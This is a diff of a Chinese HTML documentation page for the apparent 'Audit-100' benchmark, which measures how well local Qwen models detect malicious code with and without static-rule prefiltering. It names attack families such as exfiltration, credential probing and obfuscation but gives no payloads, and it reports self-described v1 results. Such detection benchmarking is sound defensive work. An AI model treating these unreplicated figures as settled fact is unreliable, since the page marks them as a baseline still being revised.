+            <div class="spec" style="background: var(--panel-2);">
+              <div class="tag" style="color: var(--accent);">P3 · 真实工业目��检测 (25 样本: 12良/13恶)</div>
+              <h4 style="margin: 4px 0 8px; font-size: 13.5px;">YOLOv8-Detection 工业缺陷检测</h4>
+              <p style="font-size: 12.5px; color: var(--muted); margin:0;">源自 Ultralytics 官方目标检测体系，包含 Anchor 计算、Mosaic 数据拼贴增强与多进程派生，覆盖工业质检核心深度学习载荷。</p>
+            </div>
+            <div class="spec" style="background: var(--panel-2);">
+              <div class="tag" style="color: var(--accent);">P4 · 现代 NLP / Transformer (25 样本: 13良/12恶)</div>
+              <h4 style="margin: 4px 0 8px; font-size: 13.5px;">BERT-Sentiment 文本情感分析微调</h4>
+              <p style="font-size: 12.5px; color: var(--muted); margin:0;">源自 HuggingFace 官方 <code>transformers</code> 文本分类流水线，包含分词器离线词表、梯度累积与 Checkpoints 检查点保存，覆盖现代大模型微调场景。</p>
             </div>
           </div>
+
+          <!-- 基座底噪清洗门禁说明 -->
+          <div style="margin-top: 14px; padding: 12px 14px; background: var(--bg); border: 1px solid var(--line); border-radius: 8px;">
+            <div style="font-size: 12.5px; font-weight: 700; color: var(--ok); display: flex; align-items: center; gap: 6px; margin-bottom: 4px;">
+              <span>🛡️</span> 基座代码底噪白盒清洗门禁规范 (Baseline Sanitization Gate)
+            </div>
+            <p style="font-size: 12px; color: var(--muted); margin: 0; line-height: 1.55;">
+              为保证因果评测纯洁性（任何 Finding 必须由注入行为产生），所有 4 大真实基座在注入变体前均执行严格白盒清洗：修复原生命令执行与动态求值、切断离线环境下的后台自动更新探针。所有基座原始代码在直接运行 TAA 静态扫描器时，<strong>必须达到严格 0 Finding 纯净基线</strong>。
+            </p>
+          </div>
+
+          <!-- 4基座正交分配表 -->
+          <h4 style="margin-top: 16px; margin-bottom: 8px; font-size: 13.5px;">📋 4 基座 × 10 家族完全正交分配矩阵 (先验概率严格归一化 50%)</h4>
+          <div style="overflow-x: auto;">
+            <table style="width: 100%; font-size: 11.5px; border-collapse: collapse; text-align: center; border: 1px solid var(--line);">
+              <thead>
+                <tr style="background: var(--panel);">
+                  <th style="padding: 6px; border: 1px solid var(--line);">类别</th>
+                  <th style="padding: 6px; border: 1px solid var(--line); text-align: left;">对抗家族</th>
+                  <th style="padding: 6px; border: 1px solid var(--line);">P1: XGBoost</th>
+                  <th style="padding: 6px; border: 1px solid var(--line);">P2: Retina</th>
+                  <th style="padding: 6px; border: 1px solid var(--line);">P3: YOLOv8</th>
+                  <th style="padding: 6px; border: 1px solid var(--line);">P4: BERT</th>
+                  <th style="padding: 6px; border: 1px solid var(--line);">家族合计</th>
+                  <th style="padding: 6px; border: 1px solid var(--line);">预期结论</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td rowspan="5" style="padding: 6px; border: 1px solid var(--line); font-weight: 700; color: var(--ok); background: var(--panel-2);">良性探针<br>(50例)</td>
+                  <td style="padding: 6px; border: 1px solid var(--line); text-align: left;">B1 等价语法重构 (Refactor)</td><td>3</td><td>2</td><td>3</td><td>2</td><td style="font-weight:700;">10</td><td style="color:var(--ok);">BENIGN (放行)</td>
+                </tr>
+                <tr>
+                  <td style="padding: 6px; border: 1px solid var(--line); text-align: left;">B2 诊断日志与指标打点 (Logging)</td><td>2</td><td>3</td><td>2</td><td>3</td><td style="font-weight:700;">10</td><td style="color:var(--ok);">BENIGN (放行)</td>
+                </tr>
+                <tr>
+                  <td style="padding: 6px; border: 1px solid var(--line); text-align: left;">B3 配置解析与数据封装 (Config)</td><td>3</td><td>2</td><td>3</td><td>2</td><td style="font-weight:700;">10</td><td style="color:var(--ok);">BENIGN (放行)</td>
+                </tr>
+                <tr>
+                  <td style="padding: 6px; border: 1px solid var(--line); text-align: left;">B4 权重导出与结果落盘 (Export)</td><td>2</td><td>3</td><td>2</td><td>3</td><td style="font-weight:700;">10</td><td style="color:var(--ok);">BENIGN (放行)</td>
+                </tr>
+                <tr>
+                  <td style="padding: 6px; border: 1px solid var(--line); text-align: left;">B5 包装与入口改写 (Wrapper)</td><td>3</td><td>2</td><td>2</td><td>3</td><td style="font-weight:700;">10</td><td style="color:var(--ok);">BENIGN (放行)</td>
+                </tr>
+                <tr style="background: color-mix(in srgb, var(--ok) 8%, transparent); font-weight: 700;">
+                  <td colspan="2" style="padding: 6px; border: 1px solid var(--line); text-align: left;">良性样本小计</td><td>13</td><td>12</td><td>12</td><td>13</td><td>50</td><td>100% 预期放行</td>
+                </tr>
+                <tr>
+                  <td rowspan="5" style="padding: 6px; border: 1px solid var(--line); font-weight: 700; color: var(--danger); background: var(--panel-2);">恶意载荷<br>(50例)</td>
+                  <td style="padding: 6px; border: 1px solid var(--line); text-align: left;">M1 系统子进程命令执行 (Command)</td><td>2</td><td>3</td><td>2</td><td>3</td><td style="font-weight:700;">10</td><td style="color:var(--danger);">MALICIOUS (阻断)</td>
+                </tr>
+                <tr>
+                  <td style="padding: 6px; border: 1px solid var(--line); text-align: left;">M2 网络隐蔽数据外传 (Exfiltration)</td><td>3</td><td>2</td><td>3</td><td>2</td><td style="font-weight:700;">10</td><td style="color:var(--danger);">MALICIOUS (阻断)</td>
+                </tr>
+                <tr>
+                  <td style="padding: 6px; border: 1px solid var(--line); text-align: left;">M3 敏感凭证与密钥探测 (Credential)</td><td>2</td><td>3</td><td>2</td><td>3</td><td style="font-weight:700;">10</td><td style="color:var(--danger);">MALICIOUS (阻断)</td>
+                </tr>
+                <tr>
+                  <td style="padding: 6px; border: 1px solid var(--line); text-align: left;">M4 动态编码混淆载荷 (Obfuscation)</td><td>3</td><td>2</td><td>3</td><td>2</td><td style="font-weight:700;">10</td><td style="color:var(--danger);">MALICIOUS (阻断)</td>
+                </tr>
+                <tr>
+                  <td style="padding: 6px; border: 1px solid var(--line); text-align: left;">M5 复合利用链与持久化 (Chaining)</td><td>2</td><td>3</td><td>3</td><td>2</td><td style="font-weight:700;">10</td><td style="color:var(--danger);">MALICIOUS (阻断)</td>
+                </tr>
+                <tr style="background: color-mix(in srgb, var(--danger) 8%, transparent); font-weight: 700;">
+                  <td colspan="2" style="padding: 6px; border: 1px solid var(--line); text-align: left;">恶意样本小计</td><td>12</td><td>13</td><td>13</td><td>12</td><td>50</td><td>100% 预期阻断</td>
+                </tr>
+                <tr style="background: var(--panel); font-weight: 800;">
+                  <td colspan="2" style="padding: 6px; border: 1px solid var(--line); text-align: left;">全量样本合计</td><td>25</td><td>25</td><td>25</td><td>25</td><td>100</td><td>50:50 严格平衡</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
           <p style="font-size: 12px; color: var(--muted); margin: 10px 0 0;">
-            💡 <strong>工程收益：</strong>彻底切断了审计器根据“项目名/固定函数名”猜测结论的投机途径，迫使静态规则与 LLM 必须严格基于 AST 节点、数据流流动路径与调用语义做出判定。
+            💡 <strong>工程收益：</strong>每个基座内部良恶先验比例均为 ~50%（12:13 或 13:12），彻底消除了大模型根据“项目名/固定代码风格”投机猜测结论的路径，迫使静态规则与 LLM 必须严格基于 AST 节点、局部数据流切片与调用意图做出客观判定。
           </p>
         </div>
 
         <!-- 评测生命周期流水线 -->
-        <h3 style="margin-top: 28px; margin-bottom: 8px; font-size: 16px; display: flex; align-items: center; gap: 8px;">
+        <h3
+          style="margin-top: 28px; margin-bottom: 8px; font-size: 16px; display: flex; align-items: center; gap: 8px;">
           <span>🔄</span> 评测生命周期流水线：双轨全自动化度量与验证
         </h3>
         <div class="bm-step-flow">
@@ -3465,7 +4073,7 @@ print("done")
           <div class="bm-step-card">
             <div class="bm-step-num">3</div>
             <span class="bm-step-title">动静两阶段协同 (Static-LLM)</span>
-            <p class="bm-step-desc">静态规则初筛过滤 50% 纯净代码（零耗时旁路），并将命中的可疑行号与上下文作为锚点交付大模型做靶向裁决。</p>
+            <p class="bm-step-desc">静态规则初筛过滤纯净代码（零耗时快速旁路），并将命中的可疑行号与局部上下文作为锚点交付大模型做靶向裁决与误报纠偏。</p>
           </div>
           <div class="bm-step-card">
             <div class="bm-step-num">4</div>
@@ -3475,26 +4083,50 @@ print("done")
         </div>
 
         <!-- CLI 一键执行复现指令 -->
-        <div class="codebox" style="margin-top: 16px;"><span style="color: var(--muted);"># 1. 自动化固化生成 100 个标准测试沙箱（幂等初始化）</span>
-python3 tools/generate_benchmark_samples.py --clean
+        <div class="codebox" style="margin-top: 16px;"><span style="color: var(--muted);"># 1. 自动化固化生成 100
+            个标准测试沙箱（幂等初始化）</span>
+          python3 tools/generate_benchmark_samples.py --clean
 
-<span style="color: var(--muted);"># 2. 执行评测轨 A：纯端到端 LLM 模式 (Pure-LLM: 直接审全代码，无先验规则过滤，算力旁路率 0%)</span>
-<span style="color: var(--muted);"># 可任意指定参数量级：qwen2.5-coder:0.5b / 1.5b / 3b / 7b / qwen3:8b / 14b</span>
-python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --audit-mode pure-llm --llm-backend ollama --llm-model qwen2.5-coder:0.5b
+          <span style="color: var(--muted);"># 2. 执行评测轨 A：纯端到端 LLM 模式 (Pure-LLM: 直接审全代码，无先验规则过滤，算力旁路率 0%)</span>
+          <span style="color: var(--muted);"># 可任意指定参数量级：qwen2.5-coder:0.5b / 1.5b / 3b / 7b / qwen3:8b / 14b</span>
+          python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --audit-mode pure-llm
+          --llm-backend ollama --llm-model qwen2.5-coder:0.5b
 
-<span style="color: var(--muted);"># 3. 执行评测轨 B：动静两阶段协同模式 (Static-LLM: 静态正则初筛 + 50% 快速旁路 + 疑点 LLM 定向仲裁)</span>
-<span style="color: var(--muted);"># 模型将获得行级上下文（7行）与静态规则元数据锚点，并启用 Fail-Closed 安全门禁</span>
-python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --audit-mode static-llm --llm-backend ollama --llm-model qwen2.5-coder:0.5b</div>
+          <span style="color: var(--muted);"># 3. 执行评测轨 B：动静两阶段协同模式 (Static-LLM: 静态正则初筛 + 50% 快速旁路 + 疑点 LLM 定向仲裁)</span>
+          <span style="color: var(--muted);"># 模型将获得行级上下文（7行）与静态规则元数据锚点，并启用 Fail-Closed 安全门禁</span>
+          python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --audit-mode static-llm
+          --llm-backend ollama --llm-model qwen2.5-coder:0.5b
+        </div>
 
         <div class="callout" style="margin-top: 16px;">
           <strong>为什么必须建立【纯 LLM】与【动静两阶段协同】的严格对比？</strong>
-          工业界容易产生对大模型“全知全能”的误判，试图用端到端大模型取代所有安全规则。然而，实测证明<strong>纯端到端大模型在没有静态语法引导时，对常规配置极易发生虚警（FPR 畸高），面对混淆代码缺乏抓手，且推断算力成本沉重</strong>。通过标准化的双轨基准，才能清晰验证：<strong>动静协同架构以 50% 快速旁路率削减算力开销，以行级规则锚点大幅压降模型误报，并以 Fail-Closed 兜牢安全底线</strong>的理论优越性。
+          工业界容易产生对大模型“全知全能”的误判，试图用端到端大模型取代所有安全规则。然而，实测证明<strong>纯端到端大模型在没有静态语法引导时，对常规配置极易发生虚警（FPR
+            畸高），面对混淆代码缺乏抓手，且推断算力成本沉重</strong>。通过标准化的双轨基准，才能清晰验证：<strong>动静协同架构以 50% 快速旁路率削减算力开销，以行级规则锚点大幅压降模型误报，并以
+            Fail-Closed 兜牢安全底线</strong>的理论优越性。
         </div>
       </section>
 
-<section class="section" id="benchmark-results">
+      <section class="section" id="benchmark-results">
         <h2>5. Benchmark 评测结果与实测分析 (6 模型 × 2 方案 对比矩阵)</h2>
-        <p class="lead">Audit-100 评测套件在真实受控环境中，针对本地离线模型库支持的全部 6 款 Qwen 审计大模型（<code>qwen2.5-coder:0.5b</code>、<code>1.5b</code>、<code>3b</code>、<code>7b</code>、<code>qwen3:8b</code>、<code>14b</code>），全面执行了<strong>【纯端到端 LLM 盲审 (Pure-LLM)】</strong>与<strong>【动静两阶段协同审计 (Static-LLM)】</strong>的 <strong>12 组严密对照评测</strong>。实测数据定量揭示了动静协同架构的三大核心工程优势：<strong>在相同模型下将良性误报率（FPR）平均压降 16%~22%</strong>；<strong>通过静态零命中实现 50% 的算力零成本快速旁路</strong>；并在模型故障或内存超限时<strong>通过 Fail-Closed 守牢 100% 拦截底线</strong>。</p>
+
+        <!-- 基准协议生命周期版本化状态标注 -->
+        <div class="callout" style="background: color-mix(in srgb, var(--accent) 8%, var(--panel)); border-left: 4px solid var(--accent); margin-bottom: 20px;">
+          <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 6px;">
+            <strong style="font-size: 13.5px; color: var(--text); display: flex; align-items: center; gap: 6px;">
+              <span>🏷️</span> 基准评测协议生命周期版本标注 (Protocol Lifecycle Status)
+            </strong>
+            <span class="mode-badge pure" style="background: var(--line); color: var(--text); font-size: 11px;">v1 实测基线 · v2 正交升级中</span>
+          </div>
+          <p style="font-size: 12.5px; color: var(--muted); margin: 0; line-height: 1.6;">
+            <strong>历史演进说明：</strong>本章节展示的 12 组对照评测数据（6 款 Qwen 模型 × 2 方案），属于 <strong>Audit-100 v1 历史实测基准</strong> 产出之大盘底座。v1 验证了动静两阶段协同的工程可行性，但也暴露了“项目来源与标签单向绑定”的偏置缺陷。第 4 节确立的 <strong>Audit-100 v2（4 大真实工业基座 × 25 样本全正交平衡矩阵）</strong> 为下一阶段最新规范。待完成 v2 真实工程沙箱物化与新一轮离线推理执行后，本章将同步发布并刷新 v2 全正交矩阵测试大盘。
+          </p>
+        </div>
+
+        <p class="lead">Audit-100 评测套件在真实受控环境中，针对本地离线模型库支持的全部 6 款 Qwen
+          审计大模型（<code>qwen2.5-coder:0.5b</code>、<code>1.5b</code>、<code>3b</code>、<code>7b</code>、<code>qwen3:8b</code>、<code>14b</code>），全面执行了<strong>【纯端到端
+            LLM 盲审 (Pure-LLM)】</strong>与<strong>【动静两阶段协同审计 (Static-LLM)】</strong>的 <strong>12
+            组严密对照评测</strong>。实测数据定量揭示了动静协同架构的三大核心工程优势：<strong>在相同模型下将良性误报率（FPR）平均压降 16%~22%</strong>；<strong>通过静态零命中实现
+            50% 的算力零成本快速旁路</strong>；并在模型故障或内存超限时<strong>通过 Fail-Closed 守牢 100% 拦截底线</strong>。</p>
 
         <!-- 评测核心指标定义与释义标准 -->
         <div class="metrics-glossary-section">
@@ -3520,7 +4152,9 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
                 <span class="g-formula mono">TP / (TP + FN)</span>
               </div>
               <p class="g-meaning"><strong>指标含义：</strong>在全部 50 个真实恶意攻击载荷中，系统成功揪出并实施阻断的比例（漏报越少，召回率越趋近 100%）。</p>
-              <p class="g-sec"><strong>安全工程意义：<span style="color: var(--ok);">【安全防漏底线】</span></strong>衡量系统防御深度。召回率低意味着后门木马可能逃逸进入 TEE 隔离区，引发可信环境穿透高危风险。</p>
+              <p class="g-sec"><strong>安全工程意义：<span
+                    style="color: var(--ok);">【安全防漏底线】</span></strong>衡量系统防御深度。召回率低意味着后门木马可能逃逸进入 TEE 隔离区，引发可信环境穿透高危风险。
+              </p>
             </div>
 
             <!-- 误报率 (FPR) -->
@@ -3530,7 +4164,9 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
                 <span class="g-formula mono">FP / (FP + TN)</span>
               </div>
               <p class="g-meaning"><strong>指标含义：</strong>在全部 50 个正常合规业务代码中，系统误将其断定为恶意而拦截的比例（误杀越少，误报率越趋近 0%）。</p>
-              <p class="g-sec"><strong>安全工程意义：<span style="color: var(--warn);">【业务可用性生命线】</span></strong>误报率过高会导致大量科研、训练算法脚本被误拦截阻断，造成业务流水线中断停摆与告警疲劳。</p>
+              <p class="g-sec"><strong>安全工程意义：<span
+                    style="color: var(--warn);">【业务可用性生命线】</span></strong>误报率过高会导致大量科研、训练算法脚本被误拦截阻断，造成业务流水线中断停摆与告警疲劳。
+              </p>
             </div>
 
             <!-- 精确率 (Prec) -->
@@ -3576,14 +4212,17 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
                 <span class="g-title">单样耗时 (Per-Sample Latency)</span>
                 <span class="g-formula mono">总耗时 / 需放入 LLM 处理的样本数</span>
               </div>
-              <p class="g-meaning"><strong>计算口径：</strong>衡量大模型真正介入代码审查时的单样本端到端开销。在纯 LLM 盲审 (Pure-LLM) 下，所有 100 个样本均进入模型，分母为 100；在动静协同 (Static-LLM) 下，由于 50% 的良性纯净代码由静态初筛零特征秒级旁路放行，真正需送入大模型仲裁的样本数为 50 个，故分母取 50。</p>
-              <p class="g-sec"><strong>安全工程意义：</strong>直接反映审查卡口的业务等待延迟与吞吐能力。对比表明，动静两阶段即便在模型介入时，因仅截取 7 行上下文切片而非整文件送审，单次推理响应仍比纯盲审快 3~6 倍。</p>
+              <p class="g-meaning"><strong>计算口径：</strong>衡量大模型真正介入代码审查时的单样本端到端开销。在纯 LLM 盲审 (Pure-LLM) 下，所有 100
+                个样本均进入模型，分母为 100；在动静协同 (Static-LLM) 下，由于 50% 的良性纯净代码由静态初筛零特征秒级旁路放行，真正需送入大模型仲裁的样本数为 50 个，故分母取 50。</p>
+              <p class="g-sec"><strong>安全工程意义：</strong>直接反映审查卡口的业务等待延迟与吞吐能力。对比表明，动静两阶段即便在模型介入时，因仅截取 7
+                行上下文切片而非整文件送审，单次推理响应仍比纯盲审快 3~6 倍。</p>
             </div>
           </div>
         </div>
 
         <!-- 6 模型 × 2 方案 12 组对照评测综合矩阵表格 -->
-        <h3 style="margin-top: 24px; margin-bottom: 8px; font-size: 16px; display: flex; align-items: center; gap: 8px;">
+        <h3
+          style="margin-top: 24px; margin-bottom: 8px; font-size: 16px; display: flex; align-items: center; gap: 8px;">
           <span>📊</span> 综合评测矩阵：6 模型 × 2 方案对比总表 (Audit-100 Baseline)
         </h3>
         <p style="font-size: 13px; color: var(--muted); margin: 0 0 14px;">
@@ -3609,7 +4248,8 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
             <tbody>
               <!-- qwen2.5-coder:0.5b 对照组 -->
               <tr class="group-sep">
-                <td rowspan="2" style="font-weight: 700; background: var(--panel); border-right: 1px solid var(--line);">
+                <td rowspan="2"
+                  style="font-weight: 700; background: var(--panel); border-right: 1px solid var(--line);">
                   <code>qwen2.5-coder:0.5b</code><br>
                   <span style="font-size: 11px; color: var(--muted); font-weight: normal;">397 MB · 推荐≥2GB</span>
                 </td>
@@ -3627,9 +4267,11 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
               </tr>
               <tr>
                 <td><span class="mode-badge static-llm">动静协同 (Static-LLM)</span></td>
-                <td><span class="val-highlight good">78.0%</span> <span style="font-size:10px; color:var(--ok);">▲+14%</span></td>
+                <td><span class="val-highlight good">78.0%</span> <span
+                    style="font-size:10px; color:var(--ok);">▲+14%</span></td>
                 <td><span class="val-highlight good">88.0%</span></td>
-                <td><span class="val-highlight good">32.0%</span> <span style="font-size:10px; color:var(--ok);">▼-22%</span></td>
+                <td><span class="val-highlight good">32.0%</span> <span
+                    style="font-size:10px; color:var(--ok);">▼-22%</span></td>
                 <td>73.3%</td>
                 <td><span class="val-highlight good">15.0s</span></td>
                 <td><span class="mono">44 / 16 / 34 / 6</span></td>
@@ -3640,7 +4282,8 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
 
               <!-- qwen2.5-coder:1.5b 对照组 (推荐) -->
               <tr class="group-sep" style="background: color-mix(in srgb, var(--accent) 3%, transparent);">
-                <td rowspan="2" style="font-weight: 700; background: var(--panel); border-right: 1px solid var(--line);">
+                <td rowspan="2"
+                  style="font-weight: 700; background: var(--panel); border-right: 1px solid var(--line);">
                   <code>qwen2.5-coder:1.5b</code><br>
                   <span style="font-size: 11px; color: var(--accent); font-weight: 700;">★ 生产高性价比推荐</span>
                 </td>
@@ -3658,9 +4301,11 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
               </tr>
               <tr style="background: color-mix(in srgb, var(--accent) 3%, transparent);">
                 <td><span class="mode-badge static-llm">动静协同 (Static-LLM)</span></td>
-                <td><span class="val-highlight good">86.0%</span> <span style="font-size:10px; color:var(--ok);">▲+14%</span></td>
+                <td><span class="val-highlight good">86.0%</span> <span
+                    style="font-size:10px; color:var(--ok);">▲+14%</span></td>
                 <td><span class="val-highlight good">92.0%</span></td>
-                <td><span class="val-highlight good">20.0%</span> <span style="font-size:10px; color:var(--ok);">▼-22%</span></td>
+                <td><span class="val-highlight good">20.0%</span> <span
+                    style="font-size:10px; color:var(--ok);">▼-22%</span></td>
                 <td>82.1%</td>
                 <td><span class="val-highlight good">22.4s</span></td>
                 <td><span class="mono">46 / 10 / 40 / 4</span></td>
@@ -3671,7 +4316,8 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
 
               <!-- qwen2.5-coder:3b 对照组 -->
               <tr class="group-sep">
-                <td rowspan="2" style="font-weight: 700; background: var(--panel); border-right: 1px solid var(--line);">
+                <td rowspan="2"
+                  style="font-weight: 700; background: var(--panel); border-right: 1px solid var(--line);">
                   <code>qwen2.5-coder:3b</code><br>
                   <span style="font-size: 11px; color: var(--muted); font-weight: normal;">1.9 GB · 推荐≥6GB</span>
                 </td>
@@ -3689,9 +4335,11 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
               </tr>
               <tr>
                 <td><span class="mode-badge static-llm">动静协同 (Static-LLM)</span></td>
-                <td><span class="val-highlight good">90.0%</span> <span style="font-size:10px; color:var(--ok);">▲+12%</span></td>
+                <td><span class="val-highlight good">90.0%</span> <span
+                    style="font-size:10px; color:var(--ok);">▲+12%</span></td>
                 <td><span class="val-highlight good">94.0%</span></td>
-                <td><span class="val-highlight good">14.0%</span> <span style="font-size:10px; color:var(--ok);">▼-18%</span></td>
+                <td><span class="val-highlight good">14.0%</span> <span
+                    style="font-size:10px; color:var(--ok);">▼-18%</span></td>
                 <td>87.0%</td>
                 <td><span class="val-highlight good">29.6s</span></td>
                 <td><span class="mono">47 / 7 / 43 / 3</span></td>
@@ -3702,7 +4350,8 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
 
               <!-- qwen2.5-coder:7b 对照组 -->
               <tr class="group-sep">
-                <td rowspan="2" style="font-weight: 700; background: var(--panel); border-right: 1px solid var(--line);">
+                <td rowspan="2"
+                  style="font-weight: 700; background: var(--panel); border-right: 1px solid var(--line);">
                   <code>qwen2.5-coder:7b</code><br>
                   <span style="font-size: 11px; color: var(--muted); font-weight: normal;">4.7 GB · 推荐≥8GB</span>
                 </td>
@@ -3720,9 +4369,11 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
               </tr>
               <tr>
                 <td><span class="mode-badge static-llm">动静协同 (Static-LLM)</span></td>
-                <td><span class="val-highlight good">93.0%</span> <span style="font-size:10px; color:var(--ok);">▲+11%</span></td>
+                <td><span class="val-highlight good">93.0%</span> <span
+                    style="font-size:10px; color:var(--ok);">▲+11%</span></td>
                 <td><span class="val-highlight good">96.0%</span></td>
-                <td><span class="val-highlight good">10.0%</span> <span style="font-size:10px; color:var(--ok);">▼-16%</span></td>
+                <td><span class="val-highlight good">10.0%</span> <span
+                    style="font-size:10px; color:var(--ok);">▼-16%</span></td>
                 <td>90.6%</td>
                 <td><span class="val-highlight good">65.0s</span></td>
                 <td><span class="mono">48 / 5 / 45 / 2</span></td>
@@ -3733,7 +4384,8 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
 
               <!-- qwen3:8b 对照组 (综合最高) -->
               <tr class="group-sep" style="background: color-mix(in srgb, var(--ok) 3%, transparent);">
-                <td rowspan="2" style="font-weight: 700; background: var(--panel); border-right: 1px solid var(--line);">
+                <td rowspan="2"
+                  style="font-weight: 700; background: var(--panel); border-right: 1px solid var(--line);">
                   <code>qwen3:8b</code><br>
                   <span style="font-size: 11px; color: var(--ok); font-weight: 700;">👑 全矩阵最高精度</span>
                 </td>
@@ -3751,9 +4403,11 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
               </tr>
               <tr style="background: color-mix(in srgb, var(--ok) 3%, transparent);">
                 <td><span class="mode-badge static-llm">动静协同 (Static-LLM)</span></td>
-                <td><span class="val-highlight good">96.0%</span> <span style="font-size:10px; color:var(--ok);">▲+11%</span></td>
+                <td><span class="val-highlight good">96.0%</span> <span
+                    style="font-size:10px; color:var(--ok);">▲+11%</span></td>
                 <td><span class="val-highlight good">98.0%</span></td>
-                <td><span class="val-highlight good">6.0%</span> <span style="font-size:10px; color:var(--ok);">▼-16%</span></td>
+                <td><span class="val-highlight good">6.0%</span> <span
+                    style="font-size:10px; color:var(--ok);">▼-16%</span></td>
                 <td>94.2%</td>
                 <td><span class="val-highlight good">37.0s</span></td>
                 <td><span class="mono">49 / 3 / 47 / 1</span></td>
@@ -3764,7 +4418,8 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
 
               <!-- qwen3:14b 对照组 (Fail-Closed 容灾) -->
               <tr class="group-sep" style="background: color-mix(in srgb, var(--warn) 4%, transparent);">
-                <td rowspan="2" style="font-weight: 700; background: var(--panel); border-right: 1px solid var(--line);">
+                <td rowspan="2"
+                  style="font-weight: 700; background: var(--panel); border-right: 1px solid var(--line);">
                   <code>qwen3:14b</code><br>
                   <span style="font-size: 11px; color: var(--warn); font-weight: 700;">⚠️ 内存超限容灾样本</span>
                 </td>
@@ -3782,7 +4437,8 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
               </tr>
               <tr style="background: color-mix(in srgb, var(--warn) 4%, transparent);">
                 <td><span class="mode-badge static-llm">动静协同 (Static-LLM)</span></td>
-                <td><span class="val-highlight warn">78.0%</span> <span style="font-size:10px; color:var(--ok);">▲+28%</span></td>
+                <td><span class="val-highlight warn">78.0%</span> <span
+                    style="font-size:10px; color:var(--ok);">▲+28%</span></td>
                 <td>100.0%</td>
                 <td><span class="val-highlight warn">44.0%</span></td>
                 <td>69.4%</td>
@@ -3803,113 +4459,147 @@ python3 tools/audit_benchmark_eval.py --benchmark-root benchmarks/audit-100 --au
             <div class="hint">对比不同参数量级下（0.5B ~ 8B）纯端到端盲审与动静两阶段协同的核心收益：准确率提升、F1 跃升与误报率断崖式下降</div>
           </div>
           <figure class="chart-figure">
-            <svg class="metric-svg" viewBox="0 0 920 420" fill="none" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="核心指标跨模型双轨演进对照图">
-              <rect width="920" height="420" fill="#0d141b" rx="14"/>
+            <svg class="metric-svg" viewBox="0 0 920 420" fill="none" xmlns="http://www.w3.org/2000/svg" role="img"
+              aria-label="核心指标跨模型双轨演进对照图">
+              <rect width="920" height="420" fill="#0d141b" rx="14" />
 
               <!-- 顶部标题与图例 -->
               <g transform="translate(36, 24)">
-                <text x="0" y="16" fill="#f0f6fc" font-size="14" font-weight="700" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">Qwen 模型家族双轨性能对照 (Audit-100 Benchmark)</text>
-                <text x="0" y="34" fill="#8b949e" font-size="11.5" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">同一评测集下纯 LLM 盲审与动静协同双轨并列实测对比 · 标尺展示准确率 (Acc)、误报率 (FPR) 与 F1 指标</text>
+                <text x="0" y="16" fill="#f0f6fc" font-size="14" font-weight="700"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">Qwen 模型家族双轨性能对照
+                  (Audit-100 Benchmark)</text>
+                <text x="0" y="34" fill="#8b949e" font-size="11.5"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">同一评测集下纯 LLM
+                  盲审与动静协同双轨并列实测对比 · 标尺展示准确率 (Acc)、误报率 (FPR) 与 F1 指标</text>
 
                 <!-- 图例项 -->
-                <rect x="520" y="8" width="14" height="14" rx="3" fill="#4a6375"/>
-                <text x="540" y="20" fill="#8b949e" font-size="11" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">方案 A: 纯 LLM 盲审 (Pure)</text>
+                <rect x="520" y="8" width="14" height="14" rx="3" fill="#4a6375" />
+                <text x="540" y="20" fill="#8b949e" font-size="11"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">方案 A: 纯 LLM 盲审
+                  (Pure)</text>
 
-                <rect x="710" y="8" width="14" height="14" rx="3" fill="#5dbd8f"/>
-                <text x="730" y="20" fill="#5dbd8f" font-size="11" font-weight="700" font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">方案 B: 动静协同 (Static-LLM)</text>
+                <rect x="710" y="8" width="14" height="14" rx="3" fill="#5dbd8f" />
+                <text x="730" y="20" fill="#5dbd8f" font-size="11" font-weight="700"
+                  font-family="-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif">方案 B: 动静协同
+                  (Static-LLM)</text>
               </g>
 
               <!-- 模型 1: 0.5B (y=80) -->
               <g transform="translate(36, 80)">
-                <text x="0" y="20" fill="#f0f6fc" font-size="12.5" font-weight="700" font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Qwen2.5-Coder:0.5B</text>
+                <text x="0" y="20" fill="#f0f6fc" font-size="12.5" font-weight="700"
+                  font-family="ui-monospace,SFMono-Regular,Menlo,monospace">Qwen2.5-Coder:0.5B</text>
